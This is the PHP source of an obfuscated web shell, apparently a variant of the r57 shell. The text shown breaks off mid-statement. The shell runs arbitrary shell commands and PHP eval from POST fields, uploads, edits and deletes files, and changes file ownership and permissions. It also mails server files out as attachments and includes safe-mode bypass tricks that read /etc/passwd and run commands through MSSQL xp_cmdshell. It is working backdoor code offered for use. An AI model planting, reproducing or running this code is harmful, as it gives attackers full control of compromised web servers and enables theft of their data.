<?php

$Vxd5eqf0ldh0='eng';

error_reporting(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
set_magic_quotes_runtime(0);
@set_time_limit(0);

if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $V2fgexxwarsd=>$V1prtvsum53w)
  {
  $_POST[$V2fgexxwarsd] = stripslashes($V1prtvsum53w);
  }
 foreach ($_SERVER as $V2fgexxwarsd=>$V1prtvsum53w)
  {
  $_SERVER[$V2fgexxwarsd] = stripslashes($V1prtvsum53w);

  }
 }

$V0pqagb4fzqa = '
<html>
<head>
<title></title>
<br>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

';


$Vbazz4zfnyqp  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: ";
$Vxww0x5eqhzw  = " ::</div></b></font></td></tr><tr><td>";
$Vflwpiiswwq4  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>";
$Vaplrpgvvrh0 = "</td></tr>";
$V2te2ds1mx4s = " <font face=Wingdings color=gray> </font>";
$Vrezpsjaz4rj = "<font color=black>[</font>";
$Vn0f54okhp3h = "<font color=black>]</font>";
$Vv1jfesmmssg = "<font face=Verdana size=-2>";
$Vm2z5ooq3owk = "<table class=table1 width=100% align=center>";
$Vlrtnwermkbo = "</table>";
$Viiccmr1jszn = "<form name=form method=POST>";
$Vrhwepcaoo35 = "</form>";


if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$Vplpou1bf0pg = @getcwd();
$Vpwyyujv134j = 0;
$Vttxt5zvpscg = 0;
if(strlen($Vplpou1bf0pg)>1 && $Vplpou1bf0pg[1]==":") $Vpwyyujv134j=1; else $Vttxt5zvpscg=1;
if(empty($Vplpou1bf0pg))
 {
 $Vnn01rxwyef4 = getenv('OS');
 if(empty($Vnn01rxwyef4)){ $Vnn01rxwyef4 = php_uname(); }
 if(empty($Vnn01rxwyef4)){ $Vnn01rxwyef4 ="-"; $Vttxt5zvpscg=1; }
 else
    {
    if(@eregi("^win",$Vnn01rxwyef4)) { $Vpwyyujv134j = 1; }
    else { $Vttxt5zvpscg = 1; }
    }
 }

if(strpos(ex("echo abcr57"),"r57")!=3) { $Vfguaxv1qacc = 1; }
$Vz1l4d1b3ds2 = getenv('SERVER_SOFTWARE');
if(empty($Vz1l4d1b3ds2)){ $Vz1l4d1b3ds2 = "-"; }
function ws($Vczhvdsshg0j)
{
return @str_repeat("&nbsp;",$Vczhvdsshg0j);
}
function ex($Vbd02lflyg3q)
{
 $Vql0shm5pywc = '';
 if (!empty($Vbd02lflyg3q))
 {
  if(function_exists('exec'))
   {
    @exec($Vbd02lflyg3q,$Vql0shm5pywc);
    $Vql0shm5pywc = join("\n",$Vql0shm5pywc);
   }
  elseif(function_exists('shell_exec'))
   {
    $Vql0shm5pywc = @shell_exec($Vbd02lflyg3q);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($Vbd02lflyg3q);
    $Vql0shm5pywc = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($Vbd02lflyg3q);
    $Vql0shm5pywc = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($Vpsge21ti2jt = @popen($Vbd02lflyg3q,"r")))
  {
   $Vql0shm5pywc = "";
   while(!@feof($Vpsge21ti2jt)) { $Vql0shm5pywc .= @fread($Vpsge21ti2jt,1024); }
   @pclose($Vpsge21ti2jt);
  }
 }
 return $Vql0shm5pywc;
}

function we($Vczhvdsshg0j)
{
if($GLOBALS['language']=="ru"){ $Vlrtnwermkboxt = '      !                         '; }
else { $Vlrtnwermkboxt = "Can't write "; }
echo "<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$Vlrtnwermkboxt.$Vczhvdsshg0j."</b></div></font></td></tr></table>";
return null;
}
function re($Vczhvdsshg0j)
{
if($GLOBALS['language']=="ru"){ $Vlrtnwermkboxt = '      !                        '; }
else { $Vlrtnwermkboxt = "Can't read "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$Vlrtnwermkboxt.$Vczhvdsshg0j."</b></div></font></td></tr></table>";
return null;
}
function ce($Vczhvdsshg0j)
{
if($GLOBALS['language']=="ru"){ $Vlrtnwermkboxt = "                   "; }
else { $Vlrtnwermkboxt = "Can't create "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$Vlrtnwermkboxt.$Vczhvdsshg0j."</b></div></font></td></tr></table>";
return null;
}
function fe($V3mlomy3xsv0,$V500z4q15xwo)
{
$Vlrtnwermkboxt['ru']  = array('                          ftp        ','                      ftp        ','                                  ftp        ');
$Vlrtnwermkboxt['eng'] = array('');
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$Vlrtnwermkboxt[$V3mlomy3xsv0][$V500z4q15xwo]."</b></div></font></td></tr></table>";
return null;
}
function mr($V3mlomy3xsv0,$V500z4q15xwo)
{
$Vlrtnwermkboxt['ru']  = array('                           ','                 ');
$Vlrtnwermkboxt['eng'] = array('');
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$Vlrtnwermkboxt[$V3mlomy3xsv0][$V500z4q15xwo]."</b></div></font></td></tr></table>";
return null;
}
function perms($Vayylf52hv3q)
{
if ($GLOBALS['windows']) return 0;
if( $Vayylf52hv3q & 0x1000 ) { $Vgen4tkwgsjk='p'; }
else if( $Vayylf52hv3q & 0x2000 ) { $Vgen4tkwgsjk='c'; }
else if( $Vayylf52hv3q & 0x4000 ) { $Vgen4tkwgsjk='d'; }
else if( $Vayylf52hv3q & 0x6000 ) { $Vgen4tkwgsjk='b'; }
else if( $Vayylf52hv3q & 0x8000 ) { $Vgen4tkwgsjk='-'; }
else if( $Vayylf52hv3q & 0xA000 ) { $Vgen4tkwgsjk='l'; }
else if( $Vayylf52hv3q & 0xC000 ) { $Vgen4tkwgsjk='s'; }
else $Vgen4tkwgsjk='u';
$Vhmnw1hnvkzm["read"] = ($Vayylf52hv3q & 00400) ? 'r' : '-';
$Vhmnw1hnvkzm["write"] = ($Vayylf52hv3q & 00200) ? 'w' : '-';
$Vhmnw1hnvkzm["execute"] = ($Vayylf52hv3q & 00100) ? 'x' : '-';
$V3mwhqwi1k5c["read"] = ($Vayylf52hv3q & 00040) ? 'r' : '-';
$V3mwhqwi1k5c["write"] = ($Vayylf52hv3q & 00020) ? 'w' : '-';
$V3mwhqwi1k5c["execute"] = ($Vayylf52hv3q & 00010) ? 'x' : '-';
$Va3n5unoiawe["read"] = ($Vayylf52hv3q & 00004) ? 'r' : '-';
$Va3n5unoiawe["write"] = ($Vayylf52hv3q & 00002) ? 'w' : '-';
$Va3n5unoiawe["execute"] = ($Vayylf52hv3q & 00001) ? 'x' : '-';
if( $Vayylf52hv3q & 0x800 ) $Vhmnw1hnvkzm["execute"] = ($Vhmnw1hnvkzm['execute']=='x') ? 's' : 'S';
if( $Vayylf52hv3q & 0x400 ) $V3mwhqwi1k5c["execute"] = ($V3mwhqwi1k5c['execute']=='x') ? 's' : 'S';
if( $Vayylf52hv3q & 0x200 ) $Va3n5unoiawe["execute"] = ($Va3n5unoiawe['execute']=='x') ? 't' : 'T';
$V0mxqn0lqyvz=sprintf("%1s", $Vgen4tkwgsjk);
$V0mxqn0lqyvz.=sprintf("%1s%1s%1s", $Vhmnw1hnvkzm['read'], $Vhmnw1hnvkzm['write'], $Vhmnw1hnvkzm['execute']);
$V0mxqn0lqyvz.=sprintf("%1s%1s%1s", $V3mwhqwi1k5c['read'], $V3mwhqwi1k5c['write'], $V3mwhqwi1k5c['execute']);
$V0mxqn0lqyvz.=sprintf("%1s%1s%1s", $Va3n5unoiawe['read'], $Va3n5unoiawe['write'], $Va3n5unoiawe['execute']);
return trim($V0mxqn0lqyvz);
}
function in($Vgen4tkwgsjk,$V500z4q15xwoame,$V0mxqn0lqyvzize,$V1prtvsum53walue)
{
 $Vjyuehi5binr = "<input type=".$Vgen4tkwgsjk." name=".$V500z4q15xwoame." ";
 if($V0mxqn0lqyvzize != 0) { $Vjyuehi5binr .= "size=".$V0mxqn0lqyvzize." "; }
 $Vjyuehi5binr .= "value=\"".$V1prtvsum53walue."\">";
 return $Vjyuehi5binr;
}
function which($Vw25hsku2juw)
{
$Vyycaoyuijpb = ex("which $Vw25hsku2juw");
if(!empty($Vyycaoyuijpb)) { return $Vyycaoyuijpb; } else { return $Vw25hsku2juw; }
}
function cf($Vpsge21ti2jtname,$Vlrtnwermkboxt)
{
 $V50d4y5b551w=@fopen($Vpsge21ti2jtname,"w") or we($Vpsge21ti2jtname);
 if($V50d4y5b551w)
 {
 @fputs($V50d4y5b551w,@base64_decode($Vlrtnwermkboxt));
 @fclose($V50d4y5b551w);
 }
}
function sr($V3mlomy3xsv0,$Vajiprikd1tz,$Vvn211aliosv)
 {
 return "<tr class=tr1><td class=td1 width=".$V3mlomy3xsv0."% align=right>".$Vajiprikd1tz."</td><td class=td1 align=left>".$Vvn211aliosv."</td></tr>";
 }
if (!@function_exists("view_size"))
{
function view_size($V0mxqn0lqyvzize)
{
 if($V0mxqn0lqyvzize >= 1073741824) {$V0mxqn0lqyvzize = @round($V0mxqn0lqyvzize / 1073741824 * 100) / 100 . " GB";}
 elseif($V0mxqn0lqyvzize >= 1048576) {$V0mxqn0lqyvzize = @round($V0mxqn0lqyvzize / 1048576 * 100) / 100 . " MB";}
 elseif($V0mxqn0lqyvzize >= 1024) {$V0mxqn0lqyvzize = @round($V0mxqn0lqyvzize / 1024 * 100) / 100 . " KB";}
 else {$V0mxqn0lqyvzize = $V0mxqn0lqyvzize . " B";}
 return $V0mxqn0lqyvzize;
}
}
  function DirFilesR($Vplpou1bf0pg,$Vgen4tkwgsjks='')
  {
    $Vpsge21ti2jtiles = Array();
    if(($Vujl4ldy00na = @opendir($Vplpou1bf0pg)))
    {
      while (false !== ($Vpsge21ti2jtile = @readdir($Vujl4ldy00na)))
      {
        if ($Vpsge21ti2jtile != "." && $Vpsge21ti2jtile != "..")
        {
          if(@is_dir($Vplpou1bf0pg."/".$Vpsge21ti2jtile))
            $Vpsge21ti2jtiles = @array_merge($Vpsge21ti2jtiles,DirFilesR($Vplpou1bf0pg."/".$Vpsge21ti2jtile,$Vgen4tkwgsjks));
          else
          {
            $Vlk35ulp34yg = @strrpos($Vpsge21ti2jtile,".");
            $Vnccjje2r0tx = @substr($Vpsge21ti2jtile,$Vlk35ulp34yg,@strlen($Vpsge21ti2jtile)-$Vlk35ulp34yg);
            if($Vgen4tkwgsjks)
            {
              if(@in_array($Vnccjje2r0tx,explode(';',$Vgen4tkwgsjks)))
                $Vpsge21ti2jtiles[] = $Vplpou1bf0pg."/".$Vpsge21ti2jtile;
            }
            else
              $Vpsge21ti2jtiles[] = $Vplpou1bf0pg."/".$Vpsge21ti2jtile;
          }
        }
      }
      @closedir($Vujl4ldy00na);
    }
    return $Vpsge21ti2jtiles;
  }
  class SearchResult
  {
    var $Vlrtnwermkboxt;
    var $Vx3hrhhlktel;
    var $Vk4iicdeqz4r;
    var $Vk53gxzyotxg;
    var $Vijxiua4xchn;
    var $Vr1zidtadzwt;
    var $Vrxiqucvafdl;
    var $Vwd2mziqd4em;
    var $Vbcvylucga52;
    function SearchResult($Vplpou1bf0pg,$Vlrtnwermkboxt,$Vpsge21ti2jtilter='')
    {
      $Vplpou1bf0pgs = @explode(";",$Vplpou1bf0pg);
      $this->FilesToSearch = Array();
      for($Vrovphnffpqb=0;$Vrovphnffpqb<count($Vplpou1bf0pgs);$Vrovphnffpqb++)
        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($Vplpou1bf0pgs[$Vrovphnffpqb],$Vpsge21ti2jtilter));
      $this->text = $Vlrtnwermkboxt;
      $this->FilesTotal = @count($this->FilesToSearch);
      $this->TimeStart = getmicrotime();
      $this->MatchesCount = 0;
      $this->ResultFiles = Array();
      $this->FileMatchesCount = Array();
      $this->titles = Array();
    }
    function GetFilesTotal() { return $this->FilesTotal; }
    function GetTitles() { return $this->titles; }
    function GetTimeTotal() { return $this->TimeTotal; }
    function GetMatchesCount() { return $this->MatchesCount; }
    function GetFileMatchesCount() { return $this->FileMatchesCount; }
    function GetResultFiles() { return $this->ResultFiles; }
    function SearchText($Vvejhynrj4ka=0,$Vutmfwhbi2as=0) {
    $Vmw1itybvzdl = @explode(' ',$this->text);
    $Vonl4thyd0cy = '|';
      if($Vvejhynrj4ka)
        foreach($Vmw1itybvzdl as $V2fgexxwarsd=>$V1prtvsum53w)
          $Vmw1itybvzdl[$V2fgexxwarsd] = '\b'.$V1prtvsum53w.'\b';
      $Vrmwd45nk3hd = '('.@implode($Vonl4thyd0cy,$Vmw1itybvzdl).')';
      $Vrndoku2x0py = "/".$Vrmwd45nk3hd."/";
      if(!$Vutmfwhbi2as)
        $Vrndoku2x0py .= 'i';
      foreach($this->FilesToSearch as $V2fgexxwarsd=>$Vpsge21ti2jtilename)
      {
        $this->FileMatchesCount[$Vpsge21ti2jtilename] = 0;
        $Vjvi5ewz1kvf = @file($Vpsge21ti2jtilename) or @next;
        for($Vrovphnffpqb=0;$Vrovphnffpqb<@count($Vjvi5ewz1kvf);$Vrovphnffpqb++)
        {
          $Vhr2iksgudhk = 0;
          $Voaey5hmj4cb = $Vjvi5ewz1kvf[$Vrovphnffpqb];
          $Voaey5hmj4cb = @Trim($Voaey5hmj4cb);
          $Voaey5hmj4cb = @strip_tags($Voaey5hmj4cb);
          $Vrovphnffpqba = '';
          if(($Vhr2iksgudhk = @preg_match_all($Vrndoku2x0py,$Voaey5hmj4cb,$Vrovphnffpqba)))
          {
            $Voaey5hmj4cb = @preg_replace($Vrndoku2x0py,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$Voaey5hmj4cb);
            $this->ResultFiles[$Vpsge21ti2jtilename][$Vrovphnffpqb+1] = $Voaey5hmj4cb;
            $this->MatchesCount += $Vhr2iksgudhk;
            $this->FileMatchesCount[$Vpsge21ti2jtilename] += $Vhr2iksgudhk;
          }
        }
      }
      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($Vjjkxt4rfqav,$V0mxqn0lqyvzec) = @explode(" ",@microtime());
    return ((float)$Vjjkxt4rfqav + (float)$V0mxqn0lqyvzec);
  }

echo $V0pqagb4fzqa;
echo '</head>';
if(empty($_POST['cmd'])) {
$V0mxqn0lqyvzerv = array(127,192,172,10);
$Vrovphnffpqbddr=@explode('.', $_SERVER['SERVER_ADDR']);
$Vnuxfmbgj0z4 = str_replace('.','',$V1prtvsum53wersion);
}
echo '<body bgcolor="#e4e0d8"><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc width=160><font face=Verdana size=2>'.ws(1).'&nbsp;
<font face=Webdings size=6><b>!</b></font><b>'.ws(2).' '.$V1prtvsum53wersion.'</b>
</font></td><td bgcolor=#cccccc><font face=Verdana size=-2>';

echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>';
echo $Vv1jfesmmssg;
if(!$Vpwyyujv134j){
echo '<font color=blue><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$Viajbbnwck1z :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";

}
else
{

}
echo "</font>";
echo "</td></tr></table>";
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail")
 {
 $Vql0shm5pywc = mail($_POST['to'],$_POST['subj'],$_POST['text'],"From: ".$Vph0m42rh5uk['from']."\r\n");
 mr($Vxd5eqf0ldh0,$Vql0shm5pywc);
 $_POST['cmd']="";
 }
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 {
 if(!$Vpsge21ti2jtile=@fopen($_POST['loc_file'],"r")) { echo re($_POST['loc_file']); $_POST['cmd']=""; }
 else
  {
    $Vpsge21ti2jtilename = @basename($_POST['loc_file']);
    $Vpsge21ti2jtiledump = @fread($Vpsge21ti2jtile,@filesize($_POST['loc_file']));
    fclose($Vpsge21ti2jtile);
    $Vup2guodcity=$Vdoja5i2uznn='';
    compress($Vpsge21ti2jtilename,$Vpsge21ti2jtiledump,$_POST['compress']);
    $Vrovphnffpqbttach = array(
                    "name"=>$Vpsge21ti2jtilename,
                    "type"=>$Vdoja5i2uznn,
                    "content"=>$Vpsge21ti2jtiledump
                   );
    if(empty($_POST['subj'])) { $_POST['subj'] = ' '; }
    if(empty($_POST['from'])) { $_POST['from'] = ''; }
    $Vql0shm5pywc = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$Vrovphnffpqbttach);
    mr($Vxd5eqf0ldh0,$Vql0shm5pywc);
    $_POST['cmd']="";
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;
   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;
   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(file_exists($_POST['mk_name']) || !$Vpsge21ti2jtile=@fopen($_POST['mk_name'],"w")) { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
       else {
        fclose($Vpsge21ti2jtile);
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text61']."</b></font></div></td></tr></table>";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text63']."</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      if($_POST['action'] == "create"){
      if(mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text62']."</b></font></div></td></tr></table>";
       }
      else { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text64']."</b></font></div></td></tr></table>";
      $_POST['cmd']="";
      }
     break;
   }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name']))
 {
 if(!$Vpsge21ti2jtile=@fopen($_POST['e_name'],"r+")) { $Vp0zze4lp40s = 1; @fclose($Vpsge21ti2jtile); }
 if(!$Vpsge21ti2jtile=@fopen($_POST['e_name'],"r")) { echo re($_POST['e_name']); $_POST['cmd']=""; }
 else {
 echo $Vflwpiiswwq4;
 echo $Vv1jfesmmssg;
 echo "<form name=save_file method=post>";
 echo ws(3)."<b>".$_POST['e_name']."</b>";
 echo "<div align=center><textarea name=e_text cols=121 rows=24>";
 echo @htmlspecialchars(@fread($Vpsge21ti2jtile,@filesize($_POST['e_name'])));
 fclose($Vpsge21ti2jtile);
 echo "</textarea>";
 echo "<input type=hidden name=e_name value=".$_POST['e_name'].">";
 echo "<input type=hidden name=dir value=".$Vplpou1bf0pg.">";
 echo "<input type=hidden name=cmd value=save_file>";
 echo (!empty($Vp0zze4lp40s)?("<br><br>".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text44']):("<br><br><input type=submit name=submit value=\" ".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_butt10']." \">"));
 echo "</div>";
 echo "</font>";
 echo "</form>";
 echo "</td></tr></table>";
 exit();
 }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 $Vu31ut4xb1eg = @filemtime($_POST['e_name']);
 if(!$Vpsge21ti2jtile=@fopen($_POST['e_name'],"w")) { echo we($_POST['e_name']); }
 else {
 if($Vttxt5zvpscg) $_POST['e_text']=@str_replace("\r\n","\n",$_POST['e_text']);
 @fwrite($Vpsge21ti2jtile,$_POST['e_text']);
 @touch($_POST['e_name'],$Vu31ut4xb1eg,$Vu31ut4xb1eg);
 $_POST['cmd']="";
 echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text45']."</b></font></div></td></tr></table>";
 }
 }


if (!empty($HTTP_POST_FILES['userfile']['name']))
{
if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $V500z4q15xwofn = $_POST['new_name']; }
else { $V500z4q15xwofn = $HTTP_POST_FILES['userfile']['name']; }
@copy($HTTP_POST_FILES['userfile']['tmp_name'],
            $_POST['dir']."/".$V500z4q15xwofn)
      or print("<font color=red face=Fixedsys><div align=center> ".$HTTP_POST_FILES['userfile']['name']."</div></font>");
}


echo $Vflwpiiswwq4;
if (empty($_POST['cmd'])&&!$Vfguaxv1qacc) { $_POST['cmd']=($Vpwyyujv134j)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd'])&&$Vfguaxv1qacc){ $_POST['cmd']="safe_dir"; }
echo $Vv1jfesmmssg.$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text1'].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=15>";
if($Vfguaxv1qacc)
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':
  $Vh33bk4ldxmt=@dir($Vplpou1bf0pg);
  if ($Vh33bk4ldxmt)
   {
   while (false!==($Vpsge21ti2jtile=$Vh33bk4ldxmt->read()))
    {
     if ($Vpsge21ti2jtile=="." || $Vpsge21ti2jtile=="..") continue;
     @clearstatcache();
     list ($Vh33bk4ldxmtev, $Vczhvdsshg0jnode, $Vczhvdsshg0jnodep, $V500z4q15xwolink, $Vcplod3svqn2, $Vncfifw3uym0, $Vczhvdsshg0jnodev, $V0mxqn0lqyvzize, $Vrovphnffpqbtime, $Vu31ut4xb1eg, $Vvclywucjinx, $Vvfdbg5bvg1c) = stat($Vpsge21ti2jtile);
     if($Vpwyyujv134j){
     echo date("d.m.Y H:i",$Vu31ut4xb1eg);
     if(@is_dir($Vpsge21ti2jtile)) echo "  <DIR> "; else printf("% 7s ",$V0mxqn0lqyvzize);
     }
     else{
     $Vhmnw1hnvkzm = @posix_getpwuid($Vcplod3svqn2);
     $V4z2ktm1qxgy = @posix_getgrgid($Vncfifw3uym0);
     echo $Vczhvdsshg0jnode." ";
     echo perms(@fileperms($Vpsge21ti2jtile));
     printf("% 4d % 9s % 9s %7s ",$V500z4q15xwolink,$Vhmnw1hnvkzm['name'],$V4z2ktm1qxgy['name'],$V0mxqn0lqyvzize);
     echo date("d.m.Y H:i ",$Vu31ut4xb1eg);
     }
     echo "$Vpsge21ti2jtile\n";
    }
   $Vh33bk4ldxmt->close();
   }
  else echo $Vlkeksd0tjv1[$Vxd5eqf0ldh0._text29];
 break;
 case 'safe_file':
  if(@is_file($_POST['file']))
   {
   $Vpsge21ti2jtile = @file($_POST['file']);
   if($Vpsge21ti2jtile)
    {
    $Vb2axgsrzza3 = @sizeof($Vpsge21ti2jtile);
    for($Vczhvdsshg0j=0;$Vczhvdsshg0j<$Vb2axgsrzza3;$Vczhvdsshg0j++) { echo htmlspecialchars($Vpsge21ti2jtile[$Vczhvdsshg0j]); }
    }
   else echo $Vlkeksd0tjv1[$Vxd5eqf0ldh0._text29];
   }
  else echo $Vlkeksd0tjv1[$Vxd5eqf0ldh0._text31];
  break;
  case 'test1':
  $Vb2axgsrzza3i = @curl_init("file://".$_POST['test1_file']."");
  $Vb2axgsrzza3f = @curl_exec($Vb2axgsrzza3i);
  echo $Vb2axgsrzza3f;
  break;
  case 'test2':
  @include($_POST['test2_file']);
  break;
  case 'test3':
  if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = "3306"; }
  $Vh33bk4ldxmtb = @mysql_connect('localhost:'.$_POST['test3_port'],$_POST['test3_ml'],$_POST['test3_mp']);

  break;
  case 'test4':
  if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = "1433"; }
  $Vh33bk4ldxmtb = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
  if($Vh33bk4ldxmtb)
   {
   if(@mssql_select_db($_POST['test4_md'],$Vh33bk4ldxmtb))
    {
     @mssql_query("drop table temp_table",$Vh33bk4ldxmtb);
     @mssql_query("create table temp_table ( string VARCHAR (500) NULL)",$Vh33bk4ldxmtb);
     @mssql_query("insert into temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$Vh33bk4ldxmtb);
     $Vql0shm5pywc = mssql_query("select * from temp_table",$Vh33bk4ldxmtb);
     while(($Vqkw1u1gcwyo=@mssql_fetch_row($Vql0shm5pywc)))
      {
      echo $Vqkw1u1gcwyo[0]."\r\n";
      }
    @mssql_query("drop table temp_table",$Vh33bk4ldxmtb);
    }
    else echo "Can't select database";
   @mssql_close($Vh33bk4ldxmtb);
   }
  else echo "Can't connect to MSSQL server";
  break;
  case 'test5':
  if (@file_exists('/tmp/mb_send_mail')) @unlink('/tmp/mb_send_mail');
  $Vnccjje2r0txra = "-C ".$_POST['test5_file']." -X /tmp/mb_send_mail";
  @mb_send_mail(NULL, NULL, NULL, NULL, $Vnccjje2r0txra);
  $V3mlomy3xsv0ines = file ('/tmp/mb_send_mail');
  foreach ($V3mlomy3xsv0ines as $V3mlomy3xsv0ine) { echo htmlspecialchars($V3mlomy3xsv0ine)."\r\n"; }
  break;
  case 'test6':
  $V0mxqn0lqyvztream = @imap_open('/etc/passwd', "", "");
  $Vplpou1bf0pg_list = @imap_list($V0mxqn0lqyvztream, trim($_POST['test6_file']), "*");
  for ($Vczhvdsshg0j = 0; $Vczhvdsshg0j < count($Vplpou1bf0pg_list); $Vczhvdsshg0j++) echo $Vplpou1bf0pg_list[$Vczhvdsshg0j]."\r\n";
  @imap_close($V0mxqn0lqyvztream);
  break;
  case 'test7':
  $V0mxqn0lqyvztream = @imap_open($_POST['test7_file'], "", "");
  $V0mxqn0lqyvztr = @imap_body($V0mxqn0lqyvztream, 1);
  echo $V0mxqn0lqyvztr;
  @imap_close($V0mxqn0lqyvztream);
  break;
 }
}
else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump")&&($_POST['cmd']!="db_query")&&($_POST['cmd']!="ftp_")){
 $Vb2axgsrzza3md_rep = ex($_POST['cmd']);
 if($Vpwyyujv134j) { echo @htmlspecialchars(@convert_cyr_string($Vb2axgsrzza3md_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($Vb2axgsrzza3md_rep)."\n"; }}


if ($_POST['cmd']=="php_eval"){
 $Vyb2nnrvkzdo = @str_replace("<?","",$_POST['php_eval']);
 $Vyb2nnrvkzdo = @str_replace("?>","",$Vyb2nnrvkzdo);
 @eval($Vyb2nnrvkzdo);}



echo "</textarea></div>";
echo "</b>";
echo "</td></tr></table>";
echo "<table width=100% cellpadding=0 cellspacing=0>";




function up_down($Vczhvdsshg0jd)
 {
 global $Vlkeksd0tjv1;
 global $Vxd5eqf0ldh0;
 return '&nbsp<img src='.$_SERVER['PHP_SELF'].'?img=1 onClick="document.getElementById(\''.$Vczhvdsshg0jd.'\').style.display = \'none\'; document.cookie=\''.$Vczhvdsshg0jd.'=0;\';" title="'.$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text109'].'"><img src='.$_SERVER['PHP_SELF'].'?img=2 onClick="document.getElementById(\''.$Vczhvdsshg0jd.'\').style.display = \'block\'; document.cookie=\''.$Vczhvdsshg0jd.'=1;\';" title="'.$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text110'].'">';
 }




function div($Vczhvdsshg0jd)
 {
 if(isset($_COOKIE[$Vczhvdsshg0jd]) && $_COOKIE[$Vczhvdsshg0jd]==0) return '<div id="'.$Vczhvdsshg0jd.'" style="display: none;">';
 return '<div id="'.$Vczhvdsshg0jd.'">';
 }


if(!$Vfguaxv1qacc){
echo $Viiccmr1jszn.$Vbazz4zfnyqp.$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text2'].up_down('id1').$Vxww0x5eqhzw.div('id1').$Vm2z5ooq3owk;
